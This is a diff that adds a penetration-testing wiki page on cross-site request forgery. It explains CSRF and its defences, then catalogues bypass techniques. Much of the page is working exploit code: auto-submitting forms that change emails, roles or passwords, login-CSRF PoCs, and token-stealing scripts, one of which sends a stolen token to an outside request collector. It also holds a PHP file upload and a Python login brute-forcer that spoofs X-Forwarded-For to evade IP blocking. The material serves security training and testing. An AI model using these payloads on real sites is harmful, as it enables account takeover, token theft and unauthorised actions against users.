@@ -1,0 +1,889 @@
+# CSRF (Cross Site Request Forgery)
+
+{{#include ../banners/hacktricks-training.md}}
+
+## Cross-Site Request Forgery (CSRF) Explained
+
+**Cross-Site Request Forgery (CSRF)** lets an attacker trigger actions through a victim's authenticated browser session. The victim visits attacker-controlled content, which causes requests through JavaScript, forms, images, or other browser primitives while the browser supplies ambient credentials.<sup>[[1]](#references)</sup><sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>
+
+### Prerequisites for a CSRF Attack
+
+To exploit a CSRF vulnerability, several conditions must be met:<sup>[[1]](#references)</sup>
+
+1. **Identify a Valuable Action**: The attacker needs to find an action worth exploiting, such as changing the user's password, email, or elevating privileges.
+2. **Ambient Credentials**: The request must carry credentials automatically, usually cookies or HTTP Basic/Digest authentication. In modern SPAs, also look for same-origin JavaScript gadgets that automatically attach bearer tokens or custom headers for you (client-side CSRF / CSPT2CSRF).
+3. **Absence of Unpredictable Parameters**: The request should not contain unpredictable parameters, as they can prevent the attack.
+
+### Quick Check
+
+When the action's response is not visible to the attacker, test for **blind CSRF** by observing side effects through a separate authenticated session, audit trail, or callback.<sup>[[12]](#references)</sup>
+
+You could **capture the request in Burp** and check CSRF protections, and to test from the browser you can click on **Copy as fetch** and check the request:
+
+<figure><img src="../images/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+### Defending Against CSRF
+
+Several countermeasures can be implemented to protect against CSRF attacks:<sup>[[1]](#references)</sup>
+
+- [**SameSite cookies**](hacking-with-cookies/index.html#samesite): This attribute prevents the browser from sending cookies along with cross-site requests. [More about SameSite cookies](hacking-with-cookies/index.html#samesite).
+- [**Cross-origin resource sharing**](cors-bypass.md): The CORS policy of the victim site can influence the feasibility of the attack, especially if the attack requires reading the response from the victim site. [Learn about CORS bypass](cors-bypass.md).
+- **User Verification**: Prompting for the user's password or solving a captcha can confirm the user's intent.
+- **Checking Referrer or Origin Headers**: Validating these headers can help ensure requests are coming from trusted sources. However, careful crafting of URLs can bypass poorly implemented checks, such as:
+  - Using `http://mal.net?orig=http://example.com` (URL ends with the trusted URL)
+  - Using `http://example.com.mal.net` (URL starts with the trusted URL)
+- **Modifying Parameter Names**: Altering the names of parameters in POST or GET requests can help in preventing automated attacks.
+- **CSRF Tokens**: Incorporating a unique CSRF token in each session and requiring this token in subsequent requests can significantly mitigate the risk of CSRF. The effectiveness of the token can be enhanced by enforcing CORS.
+
+Understanding and implementing these defenses is crucial for maintaining the security and integrity of web applications.
+
+#### Common pitfalls of defenses
+
+- SameSite pitfalls: `SameSite=Lax` still allows top-level cross-site navigations like links and form GETs, so many GET-based CSRFs remain possible. See cookie matrix in [Hacking with Cookies > SameSite](hacking-with-cookies/index.html#samesite).<sup>[[6]](#references)</sup>
+- Header checks: Validate `Origin` when present; if both `Origin` and `Referer` are absent, fail closed. Don’t rely on substring/regex matches of `Referer` that can be bypassed with lookalike domains or crafted URLs, and note the `meta name="referrer" content="never"` suppression trick.
+- Method overrides: Treat overridden methods (`_method` or override headers) as state-changing and enforce CSRF on the effective method, not just on POST.
+- Login flows: Apply CSRF protections to login as well; otherwise, login CSRF enables forced re-authentication into attacker-controlled accounts, which can be chained with stored XSS.
+
+## Defences Bypass
+
+### From POST to GET (method-conditioned CSRF validation bypass)
+
+Some applications only enforce CSRF validation on POST while skipping it for other verbs. A common anti-pattern in PHP looks like:<sup>[[5]](#references)</sup>
+
+```php
+public function csrf_check($fatal = true) {
+  if ($_SERVER['REQUEST_METHOD'] !== 'POST') return true; // GET, HEAD, etc. bypass CSRF
+  // ... validate __csrf_token here ...
+}
+```
+
+If the vulnerable endpoint also accepts parameters from $_REQUEST, you can reissue the same action as a GET request and omit the CSRF token entirely. This converts a POST-only action into a GET action that succeeds without a token.
+
+Example:
+
+- Original POST with token (intended):
+  
+  ```http
+  POST /index.php?module=Home&action=HomeAjax&file=HomeWidgetBlockList HTTP/1.1
+  Content-Type: application/x-www-form-urlencoded
+
+  __csrf_token=sid:...&widgetInfoList=[{"widgetId":"https://attacker<img src onerror=alert(1)>","widgetType":"URL"}]
+  ```
+
+- Bypass by switching to GET (no token):
+  
+  ```http
+  GET /index.php?module=Home&action=HomeAjax&file=HomeWidgetBlockList&widgetInfoList=[{"widgetId":"https://attacker<img+src+onerror=alert(1)>","widgetType":"URL"}] HTTP/1.1
+  ```
+
+Notes:
+- This pattern frequently appears alongside reflected XSS where responses are incorrectly served as text/html instead of application/json.
+- Pairing this with XSS greatly lowers exploitation barriers because you can deliver a single GET link that both triggers the vulnerable code path and avoids CSRF checks entirely.
+
+### Lack of token
+
+Applications might implement a mechanism to **validate tokens** when they are present. However, a vulnerability arises if the validation is skipped altogether when the token is absent. Attackers can exploit this by **removing the parameter** that carries the token, not just its value. This allows them to circumvent the validation process and conduct a Cross-Site Request Forgery (CSRF) attack effectively.<sup>[[2]](#references)</sup>
+
+Moreover, some implementations only check that the parameter exists but don’t validate its content, so an **empty token value is accepted**. In that case, simply submitting the request with `csrf=` is enough:<sup>[[6]](#references)</sup>
+
+```http
+POST /admin/users/role HTTP/2
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+
+username=guest&role=admin&csrf=
+```
+
+Minimal auto-submitting PoC (hiding navigation with history.pushState):
+
+```html
+<html>
+  <body>
+    <form action="https://example.com/admin/users/role" method="POST">
+      <input type="hidden" name="username" value="guest" />
+      <input type="hidden" name="role" value="admin" />
+      <input type="hidden" name="csrf" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>history.pushState('', '', '/'); document.forms[0].submit();</script>
+  </body>
+</html>
+```
+
+### CSRF token is not tied to the user session
+
+Applications **not tying CSRF tokens to user sessions** present a significant **security risk**. These systems verify tokens against a **global pool** rather than ensuring each token is bound to the initiating session.
+
+Here's how attackers exploit this:
+
+1. **Authenticate** using their own account.
+2. **Obtain a valid CSRF token** from the global pool.
+3. **Use this token** in a CSRF attack against a victim.
+
+This vulnerability allows attackers to make unauthorized requests on behalf of the victim, exploiting the application's **inadequate token validation mechanism**.<sup>[[2]](#references)</sup>
+
+### Method bypass
+
+If the request is using a "**weird**" **method**, check if the **method override** functionality is working. For example, if it's using a **PUT/DELETE/PATCH** method you can try to use a **POST** and send an override, e.g. `https://example.com/my/dear/api/val/num?_method=PUT`.
+
+This can also work by sending the **`_method` parameter inside a POST body** or using override **headers**:
+
+- `X-HTTP-Method`
+- `X-HTTP-Method-Override`
+- `X-Method-Override`
+
+Common in frameworks like **Laravel**, **Symfony**, **Express**, and others. Developers sometimes skip CSRF on non-POST verbs assuming browsers can’t issue them; with overrides, you can still reach those handlers via POST.<sup>[[6]](#references)</sup>
+
+Example request and HTML PoC:
+
+```http
+POST /users/delete HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&_method=DELETE
+```
+
+```html
+<form method="POST" action="/users/delete">
+  <input name="username" value="admin">
+  <input type="hidden" name="_method" value="DELETE">
+  <button type="submit">Delete User</button>
+</form>
+```
+
+### Custom header token bypass
+
+If the request is adding a **custom header** with a **token** to the request as **CSRF protection method**, then:<sup>[[2]](#references)</sup>
+
+- Test the request without the **custom token and the header.**
+- Test the request with exact **same length but different token**.
+
+### Client-side CSRF / CSPT2CSRF (modern SPA-driven CSRF)
+
+Modern applications often build authenticated requests in frontend JavaScript using **user-controlled inputs** such as URL parameters, path segments, fragments, `postMessage` data, `localStorage`, or uploaded JSON/config files. If attacker-controlled data reaches a `fetch()`/XHR path sink, the browser ends up issuing a **same-origin** request from the victim origin, which means:
+
+- `SameSite` cookies are usually sent because the final request is same-site.
+- Frontend code may automatically append custom CSRF headers or bearer tokens for you.
+- `Origin` / `Referer` checks can look completely legitimate because the request is emitted by the trusted frontend.
+
+This turns path/URL manipulation into a CSRF primitive even when classic cross-site form PoCs fail. A common pattern is chaining a **user-controlled GET sink** into a second **authenticated POST/PUT/DELETE sink**.<sup>[[10]](#references)</sup>
+
+Quick hunting checklist:
+
+- Instrument `fetch` / XHR and search for `../`, `%2e%2e/`, encoded slashes, or attacker-controlled full paths.
+- Check whether a controlled GET sink can feed data into a second state-changing request.
+- Review SPAs that parse imported dashboards, themes, or config files and later concatenate those fields into API paths.
+
+{{#ref}}
+client-side-path-traversal.md
+{{#endref}}
+
+### Upload gadget to CSPT2CSRF
+
+A recent variant is to upload a file that is **accepted by server-side validation** but is still **valid JSON for the frontend**. If the frontend later `JSON.parse()`s the uploaded file and concatenates one field into an API path, simply viewing or importing that file can trigger an authenticated same-origin CSRF.
+
+Minimal gadget ideas:
+
+```json
+{"aaa":"WEBP","_id":"../../../../admin/users/promote"}
+```
+
+```json
+{ "id": "../CSPT_PAYLOAD", "%PDF": "1.4" }
+```
+
+The first shape abuses validators that only look for `WEBP` magic bytes at a fixed offset. The second abuses PDF checks that only require `%PDF` near the beginning of the file.<sup>[[11]](#references)</sup>
+
+### CSRF token is verified by a cookie
+
+Applications may implement CSRF protection by duplicating the token in both a cookie and a request parameter or by setting a CSRF cookie and verifying if the token sent in the backend corresponds to the cookie. The application validates requests by checking if the token in the request parameter aligns with the value in the cookie.
+
+However, this method is vulnerable to CSRF attacks if the website has flaws allowing an attacker to set a CSRF cookie in the victim's browser, such as a CRLF vulnerability. The attacker can exploit this by loading a deceptive image that sets the cookie, followed by initiating the CSRF attack.<sup>[[2]](#references)</sup>
+
+Below is an example of how an attack could be structured:
+
+```html
+<html>
+  <!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
+  <body>
+    <script>
+      history.pushState("", "", "/")
+    </script>
+    <form action="https://example.com/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
+      <input
+        type="hidden"
+        name="csrf"
+        value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <img
+      src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E"
+      onerror="document.forms[0].submit();" />
+  </body>
+</html>
+```
+
+> [!TIP]
+> Note that if the **csrf token is related with the session cookie this attack won't work** because you will need to set the victim your session, and therefore you will be attacking yourself.
+
+### Content-Type change
+
+According to [**this**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests), in order to **avoid preflight** requests using **POST** method these are the allowed Content-Type values:<sup>[[16]](#references)</sup>
+
+- **`application/x-www-form-urlencoded`**
+- **`multipart/form-data`**
+- **`text/plain`**
+
+However, note that the **server logic may vary** depending on the **Content-Type** used so you should try the values mentioned and others like **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._
+
+Example (from [here](https://brycec.me/posts/corctf_2021_challenges)) of sending JSON data as text/plain:<sup>[[14]](#references)</sup>
+
+```html
+<html>
+  <body>
+    <form
+      id="form"
+      method="post"
+      action="https://phpme.be.ax/"
+      enctype="text/plain">
+      <input
+        name='{"garbageeeee":"'
+        value='", "yep": "yep yep yep", "url": "https://webhook/"}' />
+    </form>
+    <script>
+      form.submit()
+    </script>
+  </body>
+</html>
+```
+
+### Bypassing Preflight Requests for JSON Data
+
+When attempting to send JSON data via a POST request, using the `Content-Type: application/json` in an HTML form is not directly possible. Similarly, utilizing `XMLHttpRequest` to send this content type initiates a preflight request. Nonetheless, there are strategies to potentially bypass this limitation and check if the server processes the JSON data irrespective of the Content-Type:
+
+1. **Use Alternative Content Types**: Employ `Content-Type: text/plain` or `Content-Type: application/x-www-form-urlencoded` by setting `enctype="text/plain"` in the form. This approach tests if the backend utilizes the data regardless of the Content-Type.
+2. **Modify Content Type**: To avoid a preflight request while ensuring the server recognizes the content as JSON, you can send the data with `Content-Type: text/plain; application/json`. This doesn't trigger a preflight request but might be processed correctly by the server if it's configured to accept `application/json`.
+3. **SWF Flash File Utilization**: A less common but feasible method involves using an SWF flash file to bypass such restrictions. For an in-depth understanding of this technique, refer to [this post](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).<sup>[[15]](#references)</sup>
+
+### Referrer / Origin check bypass
+
+**Avoid Referrer header**
+
+Applications may validate the 'Referer' header only when it's present. To prevent a browser from sending this header, the following HTML meta tag can be used:
+
+```xml
+<meta name="referrer" content="never">
+```
+
+This ensures the `Referer` header is omitted, potentially bypassing validation checks in some applications.<sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>
+
+**Regexp bypasses**
+
+
+{{#ref}}
+ssrf-server-side-request-forgery/url-format-bypass.md
+{{#endref}}
+
+To place the trusted domain string inside a query parameter that will appear in the `Referer`, use a URL such as the following:<sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>
+
+```html
+<html>
+  <!-- Referrer policy needed to send the query parameter in the referrer -->
+  <head>
+    <meta name="referrer" content="unsafe-url" />
+  </head>
+  <body>
+    <script>
+      history.pushState("", "", "/")
+    </script>
+    <form
+      action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email"
+      method="POST">
+      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      // You need to set this or the domain won't appear in the query of the referer header
+      history.pushState(
+        "",
+        "",
+        "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net"
+      )
+      document.forms[0].submit()
+    </script>
+  </body>
+</html>
+```
+
+### **HEAD method bypass**
+
+The first part of [**this CTF writeup**](https://github.com/google/google-ctf/tree/main/2023/quals/web-vegsoda/solution) explains that [Oak's source code](https://github.com/oakserver/oak/blob/main/router.ts#L281) routes **HEAD requests through GET handlers** while omitting the response body—a common behavior that is not unique to Oak. Instead of a separate handler for HEAD requests, the application invokes the GET handler and suppresses the body.<sup>[[9]](#references)</sup>
+
+Therefore, if a GET request is being limited, you could just **send a HEAD request that will be processed as a GET request**.<sup>[[9]](#references)</sup>
+
+### Browser-to-localhost / local service CSRF
+
+Don't limit CSRF hunting to the target origin. Desktop agents, update daemons, browser helpers, wallet software, IDE/dev servers, and admin panels often expose HTTP APIs on `127.0.0.1`, `localhost`, `0.0.0.0`, or RFC1918 addresses and trust that **only the local user** can reach them.
+
+Common weak points:
+
+- permissive or substring-based `Origin` checks
+- no CSRF token because loopback is assumed to be trusted
+- JSON endpoints that also accept `text/plain` or other relaxed content types
+- browser quirks or alternative loopback aliases that bypass local-network assumptions
+
+Minimal probe:
+
+```javascript
+fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
+})
+```
+
+For a real-world case study, check [this other page about browser-to-localhost abuse](../windows-hardening/windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md).
+
+## **Exploit Examples**
+
+### Stored CSRF via user-generated HTML
+
+When rich-text editors or HTML injection are allowed, you can persist a passive fetch that hits a vulnerable GET endpoint. Any user who views the content will automatically perform the request with their cookies.<sup>[[6]](#references)</sup>
+
+- If the app uses a global CSRF token that is not bound to the user session, the same token may work for all users, making stored CSRF reliable across victims.
+
+Minimal example that changes the viewer’s email when loaded:
+
+```html
+<img src="https://example.com/account/settings?newEmail=attacker@example.com" alt="">
+```
+
+### Login CSRF chained with stored XSS
+
+Login CSRF alone may be low impact, but chaining it with an authenticated stored XSS becomes powerful: force the victim to authenticate into an attacker-controlled account; once in that context, a stored XSS in an authenticated page executes and can steal tokens, hijack the session, or escalate privileges.<sup>[[6]](#references)</sup>
+
+- Ensure the login endpoint is CSRF-able (no per-session token or origin check) and no user interaction gates block it.
+- After forced login, auto-navigate to a page containing the attacker’s stored XSS payload.
+
+Minimal login-CSRF PoC:
+
+```html
+<html>
+  <body>
+    <form action="https://example.com/login" method="POST">
+      <input type="hidden" name="username" value="attacker@example.com" />
+      <input type="hidden" name="password" value="StrongPass123!" />
+      <input type="submit" value="Login" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+      // Optionally redirect to a page with stored XSS in the attacker account
+      // location = 'https://example.com/app/inbox';
+    </script>
+  </body>
+</html>
+```
+
+
+### **Exfiltrating CSRF Token**
+
+If a **CSRF token** is being used as **defence** you could try to **exfiltrate it** abusing a [**XSS**](xss-cross-site-scripting/index.html#xss-stealing-csrf-tokens) vulnerability or a [**Dangling Markup**](dangling-markup-html-scriptless-injection/index.html) vulnerability.
+
+### **GET using HTML tags**
+
+```xml
+<img src="http://google.es?param=VALUE" style="display:none" />
+<h1>404 - Page not found</h1>
+The URL you are requesting is no longer available
+```
+
+Other HTML5 tags that can be used to automatically send a GET request are:
+
+```html
+<iframe src="..."></iframe>
+<script src="..."></script>
+<img src="..." alt="" />
+<embed src="..." />
+<audio src="...">
+  <video src="...">
+    <source src="..." type="..." />
+    <video poster="...">
+      <link rel="stylesheet" href="..." />
+      <object data="...">
+        <body background="...">
+          <div style="background: url('...');"></div>
+          <style>
+            body {
+              background: url("...");
+            }
+          </style>
+          <bgsound src="...">
+            <track src="..." kind="subtitles" />
+            <input type="image" src="..." alt="Submit Button"
+          /></bgsound>
+        </body>
+      </object>
+    </video>
+  </video>
+</audio>
+```
+
+### Form GET request
+
+```html
+<html>
+  <!-- CSRF PoC - generated by Burp Suite Professional -->
+  <body>
+    <script>
+      history.pushState("", "", "/")
+    </script>
+    <form method="GET" action="https://victim.net/email/change-email">
+      <input type="hidden" name="email" value="some@email.com" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit()
+    </script>
+  </body>
+</html>
+```
+
+### Form POST request
+
+```html
+<html>
+  <body>
+    <script>
+      history.pushState("", "", "/")
+    </script>
+    <form
+      method="POST"
+      action="https://victim.net/email/change-email"
+      id="csrfform">
+      <input
+        type="hidden"
+        name="email"
+        value="some@email.com"
+        autofocus
+        onfocus="csrfform.submit();" />
+      <!-- Way 1 to autosubmit -->
+      <input type="submit" value="Submit request" />
+      <img src="x" onerror="csrfform.submit();" />
+      <!-- Way 2 to autosubmit -->
+    </form>
+    <script>
+      document.forms[0].submit() //Way 3 to autosubmit
+    </script>
+  </body>
+</html>
+```
+
+### Form POST request through iframe
+
+```html
+<!-- 
+The request is sent through the iframe without reloading the page 
+-->
+<html>
+  <body>
+    <iframe style="display:none" name="csrfframe"></iframe>
+    <form method="POST" action="/change-email" id="csrfform" target="csrfframe">
+      <input
+        type="hidden"
+        name="email"
+        value="some@email.com"
+        autofocus
+        onfocus="csrfform.submit();" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit()
+    </script>
+  </body>
+</html>
+```
+
+### **Ajax POST request**
+
+```html
+<script>
+  var xh
+  if (window.XMLHttpRequest) {
+    // code for IE7+, Firefox, Chrome, Opera, Safari
+    xh = new XMLHttpRequest()
+  } else {
+    // code for IE6, IE5
+    xh = new ActiveXObject("Microsoft.XMLHTTP")
+  }
+  xh.withCredentials = true
+  xh.open(
+    "POST",
+    "http://challenge01.root-me.org/web-client/ch22/?action=profile"
+  )
+  xh.setRequestHeader("Content-type", "application/x-www-form-urlencoded") //to send proper header info (optional, but good to have as it may sometimes not work without this)
+  xh.send("username=abcd&status=on")
+</script>
+
+<script>
+  //JQuery version
+  $.ajax({
+    type: "POST",
+    url: "https://google.com",
+    data: "param=value&param2=value2",
+  })
+</script>
+```
+
+### multipart/form-data POST request
+
+```javascript
+myFormData = new FormData()
+var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text" })
+myFormData.append("newAttachment", blob, "pwned.php")
+fetch("http://example/some/path", {
+  method: "post",
+  body: myFormData,
+  credentials: "include",
+  headers: { "Content-Type": "application/x-www-form-urlencoded" },
+  mode: "no-cors",
+})
+```
+
+### multipart/form-data POST request v2
+
+```javascript
+// https://www.exploit-db.com/exploits/20009
+var fileSize = fileData.length,
+  boundary = "OWNEDBYOFFSEC",
+  xhr = new XMLHttpRequest()
+xhr.withCredentials = true
+xhr.open("POST", url, true)
+//  MIME POST request.
+xhr.setRequestHeader(
+  "Content-Type",
+  "multipart/form-data, boundary=" + boundary
+)
+xhr.setRequestHeader("Content-Length", fileSize)
+var body = "--" + boundary + "\r\n"
+body +=
+  'Content-Disposition: form-data; name="' +
+  nameVar +
+  '"; filename="' +
+  fileName +
+  '"\r\n'
+body += "Content-Type: " + ctype + "\r\n\r\n"
+body += fileData + "\r\n"
+body += "--" + boundary + "--"
+
+//xhr.send(body);
+xhr.sendAsBinary(body)
+```
+
+### Form POST request from within an iframe
+
+```html
+<--! expl.html -->
+
+<body onload="envia()">
+  <form
+    method="POST"
+    id="formulario"
+    action="http://aplicacion.example.com/cambia_pwd.php">
+    <input type="text" id="pwd" name="pwd" value="otra nueva" />
+  </form>
+  <body>
+    <script>
+      function envia() {
+        document.getElementById("formulario").submit()
+      }
+    </script>
+
+    <!-- public.html -->
+    <iframe src="2-1.html" style="position:absolute;top:-5000"> </iframe>
+    <h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
+  </body>
+</body>
+```
+
+### **Steal CSRF Token and send a POST request**
+
+```javascript
+function submitFormWithTokenJS(token) {
+  var xhr = new XMLHttpRequest()
+  xhr.open("POST", POST_URL, true)
+  xhr.withCredentials = true
+
+  // Send the proper header information along with the request
+  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
+
+  // This is for debugging and can be removed
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+      //console.log(xhr.responseText);
+    }
+  }
+
+  xhr.send("token=" + token + "&otherparama=heyyyy")
+}
+
+function getTokenJS() {
+  var xhr = new XMLHttpRequest()
+  // This tells it to return the response as an HTML document
+  xhr.responseType = "document"
+  xhr.withCredentials = true
+  // true on the end of here makes the call asynchronous
+  xhr.open("GET", GET_URL, true)
+  xhr.onload = function (e) {
+    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+      // Get the document from the response
+      page = xhr.response
+      // Get the input element
+      input = page.getElementById("token")
+      // Show the token
+      //console.log("The token is: " + input.value);
+      // Use the token to submit the form
+      submitFormWithTokenJS(input.value)
+    }
+  }
+  // Make the request
+  xhr.send(null)
+}
+
+var GET_URL = "http://google.com?param=VALUE"
+var POST_URL = "http://google.com?param=VALUE"
+getTokenJS()
+```
+
+### **Steal CSRF Token and send a Post request using an iframe, a form and Ajax**
+
+```html
+<form
+  id="form1"
+  action="http://google.com?param=VALUE"
+  method="post"
+  enctype="multipart/form-data">
+  <input type="text" name="username" value="AA" />
+  <input type="checkbox" name="status" checked="checked" />
+  <input id="token" type="hidden" name="token" value="" />
+</form>
+
+<script type="text/javascript">
+  function f1() {
+    x1 = document.getElementById("i1")
+    x1d = x1.contentWindow || x1.contentDocument
+    t = x1d.document.getElementById("token").value
+
+    document.getElementById("token").value = t
+    document.getElementById("form1").submit()
+  }
+</script>
+<iframe
+  id="i1"
+  style="display:none"
+  src="http://google.com?param=VALUE"
+  onload="javascript:f1();"></iframe>
+```
+
+### **Steal CSRF Token and send a POST request using an iframe and a form**
+
+```html
+<iframe
+  id="iframe"
+  src="http://google.com?param=VALUE"
+  width="500"
+  height="500"
+  onload="read()"></iframe>
+
+<script>
+  function read() {
+    var name = "admin2"
+    var token =
+      document.getElementById("iframe").contentDocument.forms[0].token.value
+    document.writeln(
+      '<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">'
+    )
+    document.writeln(
+      '<input id="username" type="text" name="username" value="' +
+        name +
+        '" /><br />'
+    )
+    document.writeln(
+      '<input id="token" type="hidden" name="token" value="' + token + '" />'
+    )
+    document.writeln(
+      '<input type="submit" name="submit" value="Submit" /><br/>'
+    )
+    document.writeln("</form>")
+    document.forms[0].submit.click()
+  }
+</script>
+```
+
+### **Steal token and send it using 2 iframes**
+
+```html
+<script>
+var token;
+function readframe1(){
+  token = frame1.document.getElementById("profile").token.value;
+  document.getElementById("bypass").token.value = token
+  loadframe2();
+}
+function loadframe2(){
+  var test = document.getElementbyId("frame2");
+  test.src = "http://requestb.in/1g6asbg1?token="+token;
+}
+</script>
+
+<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
+sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
+height="600" width="800"></iframe>
+
+<iframe id="frame2" name="frame2"
+sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
+height="600" width="800"></iframe>
+<body onload="document.forms[0].submit()">
+<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
+  <input type="text" name="username" value="z">
+  <input type="checkbox" name="status" checked="">
+  <input id="token" type="hidden" name="token" value="0000" />
+  <button type="submit">Submit</button>
+</form>
+```
+
+### **POSTSteal CSRF token with Ajax and send a post with a form**
+
+```html
+<body onload="getData()">
+  <form
+    id="form"
+    action="http://google.com?param=VALUE"
+    method="POST"
+    enctype="multipart/form-data">
+    <input type="hidden" name="username" value="root" />
+    <input type="hidden" name="status" value="on" />
+    <input type="hidden" id="findtoken" name="token" value="" />
+    <input type="submit" value="valider" />
+  </form>
+
+  <script>
+    var x = new XMLHttpRequest()
+    function getData() {
+      x.withCredentials = true
+      x.open("GET", "http://google.com?param=VALUE", true)
+      x.send(null)
+    }
+    x.onreadystatechange = function () {
+      if (x.readyState == XMLHttpRequest.DONE) {
+        var token = x.responseText.match(/name="token" value="(.+)"/)[1]
+        document.getElementById("findtoken").value = token
+        document.getElementById("form").submit()
+      }
+    }
+  </script>
+</body>
+```
+
+### CSRF with Socket.IO
+
+```html
+<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
+<script>
+  let socket = io("http://six.jh2i.com:50022/test")
+
+  const username = "admin"
+
+  socket.on("connect", () => {
+    console.log("connected!")
+    socket.emit("join", {
+      room: username,
+    })
+    socket.emit("my_room_event", {
+      data: "!flag",
+      room: username,
+    })
+  })
+</script>
+```
+
+## CSRF Login Brute Force
+
+The code can be used to brute-force a login form using a CSRF token (It's also using the header X-Forwarded-For to try to bypass a possible IP blacklisting):
+
+```python
+import request
+import re
+import random
+
+URL = "http://10.10.10.191/admin/"
+PROXY = { "http": "127.0.0.1:8080"}
+SESSION_COOKIE_NAME = "BLUDIT-KEY"
+USER = "fergus"
+PASS_LIST="./words"
+
+def init_session():
+    #Return CSRF + Session (cookie)
+    r = requests.get(URL)
+    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
+    csrf = csrf.group(1)
+    session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
+    return csrf, session_cookie
+
+def login(user, password):
+    print(f"{user}:{password}")
+    csrf, cookie = init_session()
+    cookies = {SESSION_COOKIE_NAME: cookie}
+    data = {
+        "tokenCSRF": csrf,
+        "username": user,
+        "password": password,
+        "save": ""
+    }
+    headers = {
+        "X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
+    }
+    r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
+    if "Username or password incorrect" in r.text:
+        return False
+    else:
+        print(f"FOUND {user} : {password}")
+        return True
+
+with open(PASS_LIST, "r") as f:
+    for line in f:
+        login(USER, line.strip())
+```
+
+## Tools <a href="#tools" id="tools"></a>
+
+Use purpose-built tooling and hands-on labs to validate PoCs without losing browser-specific behavior.<sup>[[13]](#references)</sup>
+
+- [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
+- [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)
+- [Burp Suite Professional – Generate CSRF PoCs](https://portswigger.net/burp)
+- [https://github.com/doyensec/eval-villain](https://github.com/doyensec/eval-villain) - Useful to instrument `fetch` / XHR sinks while hunting CSPT2CSRF in SPAs.
+- [https://github.com/doyensec/CSPTBurpExtension](https://github.com/doyensec/CSPTBurpExtension) - Useful to correlate client-controlled sources with later request-path sinks.
+
+## References
+
+- [1] [PortSwigger Web Security Academy: Cross-site request forgery (CSRF)](https://portswigger.net/web-security/csrf)
+- [2] [PortSwigger Web Security Academy: Bypassing CSRF token validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
+- [3] [PortSwigger Web Security Academy: Bypassing referer-based CSRF defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
+- [4] [Bypass Referer Check Logic for CSRF](https://www.hahwul.com/blog/2019/bypass-referer-check-logic-for-csrf/)
+- [5] [VTENEXT 25.02 – A Three-Way Path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
+- [6] [Ultimate guide to CSRF vulnerabilities (YesWeHack)](https://www.yeswehack.com/learn-bug-bounty/ultimate-guide-csrf-vulnerabilities)
+- [7] [OWASP: Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf)
+- [8] [Wikipedia: Cross-site request forgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery)
+- [9] [Google CTF 2023 - web-vegsoda solution writeup](https://github.com/google/google-ctf/tree/main/2023/quals/web-vegsoda/solution)
+- [10] [Doyensec: Exploiting Client-Side Path Traversal to Perform Cross-Site Request Forgery](https://blog.doyensec.com/2024/07/02/cspt2csrf.html)
+- [11] [Doyensec: Bypassing File Upload Restrictions To Exploit Client-Side Path Traversal](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
+- [12] [Hackernoon: Blind CSRF](https://hackernoon.com/blind-attacks-understanding-csrf-cross-site-request-forgery)
+- [13] [YesWeHack Dojo: Hands-on labs](https://dojo-yeswehack.com/)
+- [14] [brycec - corCTF 2021 challenges writeup](https://brycec.me/posts/corctf_2021_challenges)
